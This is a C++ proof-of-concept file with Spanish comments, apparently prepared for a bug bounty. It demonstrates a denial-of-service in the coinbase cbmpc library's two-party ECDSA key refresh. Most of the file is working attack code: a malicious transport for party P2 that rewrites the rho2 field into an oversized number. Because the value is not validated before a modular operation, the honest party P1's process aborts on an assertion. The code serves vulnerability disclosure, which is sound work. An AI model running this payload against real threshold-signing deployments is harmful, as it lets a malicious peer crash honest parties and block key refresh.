// ============================================================================
// poc_refresh_dos.cpp — PoC MÍNIMO y DETERMINISTA (sin fuzzer, sin RNG hook)
// ----------------------------------------------------------------------------
// Demuestra un Denial-of-Service en coinbase::api::ecdsa_2p::refresh.
//
// Modelo de amenaza (BUG_BOUNTY.md): P1 es HONESTO y corre la librería SIN
// MODIFICAR vía la API pública. P2 es malicioso y solo interactúa por el límite
// del protocolo: su transporte corrompe UN campo del mensaje de red que le manda
// a P1 durante refresh. NO se toca include-internal/ como entry point.
//
// El bug: en src/cbmpc/protocol/ecdsa_2p.cpp:210, P1 calcula
//     MODULO(q) { rho = rho1 + rho2; }
// usando `rho2` recibido de P2 SIN validar antes que rho2 esté en [0, q). Un
// rho2 fuera de rango dispara el assert `is_in_range` en mod_t::check() y aborta
// el proceso de la parte HONESTA (SIGABRT), en vez de devolver un error_t limpio
// como sí hacen las otras validaciones del mismo refresh (líneas 162/166/170).
//
// Compilar: ver build_poc.sh
// Correr:   ./poc_refresh_dos   ->  aborta con "Assertion failed: is_in_range(a)"
// ============================================================================

#include <cbmpc/api/curve.h>
#include <cbmpc/api/ecdsa_2p.h>
#include <cbmpc/core/buf.h>
#include <cbmpc/core/error.h>
#include <cbmpc/core/job.h>

#include <atomic>
#include <condition_variable>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <deque>
#include <mutex>
#include <string_view>
#include <thread>
#include <vector>

using namespace coinbase;
namespace e2 = coinbase::api::ecdsa_2p;

// ---------------------------------------------------------------------------
// Canal 2P en memoria (transporte de juguete; ambas partes en el mismo proceso
// solo para el PoC — en producción serían dos máquinas).
// ---------------------------------------------------------------------------
struct channel_t {
  std::mutex m;
  std::condition_variable cv;
  std::deque<buf_t> q[2][2];  // q[emisor][receptor]
  bool aborted = false;
  void abort_all() { { std::lock_guard<std::mutex> lk(m); aborted = true; } cv.notify_all(); }
};

// P1: transporte HONESTO, no modifica nada.
struct honest_transport_t : public coinbase::api::data_transport_i {
  channel_t& ch; int me;
  honest_transport_t(channel_t& c, int me_) : ch(c), me(me_) {}
  error_t send(coinbase::api::party_idx_t rcv, mem_t msg) override {
    { std::lock_guard<std::mutex> lk(ch.m); ch.q[me][(int)rcv].emplace_back(msg.data, msg.size); }
    ch.cv.notify_all(); return SUCCESS;
  }
  error_t receive(coinbase::api::party_idx_t snd, buf_t& msg) override {
    std::unique_lock<std::mutex> lk(ch.m);
    ch.cv.wait(lk, [&] { return ch.aborted || !ch.q[(int)snd][me].empty(); });
    if (ch.q[(int)snd][me].empty()) return coinbase::error(E_NET_GENERAL);
    msg = ch.q[(int)snd][me].front(); ch.q[(int)snd][me].pop_front();
    return SUCCESS;
  }
  error_t receive_all(const std::vector<coinbase::api::party_idx_t>& s, std::vector<buf_t>& m) override {
    m.resize(s.size());
    for (size_t i = 0; i < s.size(); ++i) if (error_t rv = receive(s[i], m[i])) return rv;
    return SUCCESS;
  }
};

// P2: transporte MALICIOSO. Corrompe el SEGUNDO mensaje que le manda a P1
// (el de refresh ronda 2: ser(rho2, pi1_V_tag, pi2_V)). Ese mensaje empieza con
// la serialización de `rho2` (un bn_t). Le prependemos bytes 0xFF para que el
// valor decodificado de rho2 sea gigante (>> q) => fuera de rango en P1.
struct malicious_transport_t : public coinbase::api::data_transport_i {
  channel_t& ch; int me;
  int sends_to_p1 = 0;
  malicious_transport_t(channel_t& c, int me_) : ch(c), me(me_) {}

  error_t send(coinbase::api::party_idx_t rcv, mem_t msg) override {
    buf_t out(msg.data, msg.size);
    // El 2do envío P2->P1 durante refresh es ser(rho2, ...). Inflamos rho2.
    if ((int)rcv == 0 && ++sends_to_p1 == 2) {
      out = inflate_first_bn(out);
      std::fprintf(stderr, "[P2 malicioso] rho2 inflado fuera de rango en el mensaje de refresh ronda 2\n");
    }
    { std::lock_guard<std::mutex> lk(ch.m); ch.q[me][(int)rcv].push_back(out); }
    ch.cv.notify_all(); return SUCCESS;
  }
  error_t receive(coinbase::api::party_idx_t snd, buf_t& msg) override {
    std::unique_lock<std::mutex> lk(ch.m);
    ch.cv.wait(lk, [&] { return ch.aborted || !ch.q[(int)snd][me].empty(); });
    if (ch.q[(int)snd][me].empty()) return coinbase::error(E_NET_GENERAL);
    msg = ch.q[(int)snd][me].front(); ch.q[(int)snd][me].pop_front();
    return SUCCESS;
  }
  error_t receive_all(const std::vector<coinbase::api::party_idx_t>& s, std::vector<buf_t>& m) override {
    m.resize(s.size());
    for (size_t i = 0; i < s.size(); ++i) if (error_t rv = receive(s[i], m[i])) return rv;
    return SUCCESS;
  }

  // El bn_t se serializa como convert_len(tamaño) seguido de los bytes big-endian.
  // Reescribimos el primer prefijo de longitud a un valor grande y rellenamos con
  // 0xFF para que rho2 decodifique como un entero >> q (fuera de rango).
  static buf_t inflate_first_bn(const buf_t& in) {
    // Prefijo convert_len de 2 bytes para 0x0100 = 256 bytes de valor (>> 32 de q).
    // Formato 2 bytes: 10xxxxxx xxxxxxxx  (top bits 10). 256 = 0x0100.
    const int kValLen = 256;
    buf_t out(2 + kValLen + (in.size() > 1 ? in.size() - 1 : 0));
    uint8_t* p = out.data();
    p[0] = (uint8_t)(0x80 | ((kValLen >> 8) & 0x3f));  // 0x81
    p[1] = (uint8_t)(kValLen & 0xff);                   // 0x00
    for (int i = 0; i < kValLen; ++i) p[2 + i] = 0xFF;  // valor = 2^2048-1, >> q
    // Anexar el resto del mensaje original (después de su primer byte de longitud)
    // para que el deser siga leyendo los campos que vienen tras rho2.
    if (in.size() > 1)
      std::memcpy(p + 2 + kValLen, in.data() + 1, (size_t)in.size() - 1);
    return out;
  }
};

int main() {
  const auto curve = coinbase::api::curve_id::secp256k1;

  // ---- 1) DKG limpio: genera un par de claves válido (RNG REAL, sin tocar) ----
  channel_t ch;
  honest_transport_t d1(ch, 0), d2(ch, 1);
  std::string_view n1 = "P1", n2 = "P2";
  coinbase::api::job_2p_t dj1{coinbase::api::party_2p_t::p1, n1, n2, d1};
  coinbase::api::job_2p_t dj2{coinbase::api::party_2p_t::p2, n1, n2, d2};

  buf_t k1, k2;
  error_t r1 = E_GENERAL, r2 = E_GENERAL;
  std::thread t1([&] { r1 = e2::dkg(dj1, curve, k1); if (r1) ch.abort_all(); });
  std::thread t2([&] { r2 = e2::dkg(dj2, curve, k2); if (r2) ch.abort_all(); });
  t1.join(); t2.join();
  if (r1 != SUCCESS || r2 != SUCCESS) { std::fprintf(stderr, "DKG falló, no se pudo montar el PoC\n"); return 2; }
  std::fprintf(stderr, "[setup] DKG OK — claves válidas generadas.\n");

  // ---- 2) REFRESH con P2 malicioso: corrompe rho2 en tránsito hacia P1 ----
  // P1 corre la librería SIN modificar. El único componente malicioso es el
  // transporte de P2, que actúa solo en el límite del protocolo.
  channel_t ch2;
  honest_transport_t h1(ch2, 0);       // P1 HONESTO
  malicious_transport_t m2(ch2, 1);    // P2 MALICIOSO (MITM sobre su propio canal)
  coinbase::api::job_2p_t rj1{coinbase::api::party_2p_t::p1, n1, n2, h1};
  coinbase::api::job_2p_t rj2{coinbase::api::party_2p_t::p2, n1, n2, m2};

  buf_t nk1, nk2;
  error_t rr1 = E_GENERAL, rr2 = E_GENERAL;
  std::fprintf(stderr, "[run] Ejecutando refresh con P2 malicioso...\n");
  std::thread tr1([&] { rr1 = e2::refresh(rj1, k1, nk1); if (rr1) ch2.abort_all(); });
  std::thread tr2([&] { rr2 = e2::refresh(rj2, k2, nk2); if (rr2) ch2.abort_all(); });
  tr1.join(); tr2.join();

  // Si llegamos acá, P1 NO crasheó (la lib ya está parcheada o el ataque no
  // aplica en esta versión). Reportamos el resultado.
  std::fprintf(stderr, "[result] refresh terminó SIN crash. rv_P1=%x rv_P2=%x\n",
               (unsigned)rr1, (unsigned)rr2);
  std::fprintf(stderr, "Si esperabas el crash y no ocurrió, la vulnerabilidad puede estar ya corregida.\n");
  return 0;
}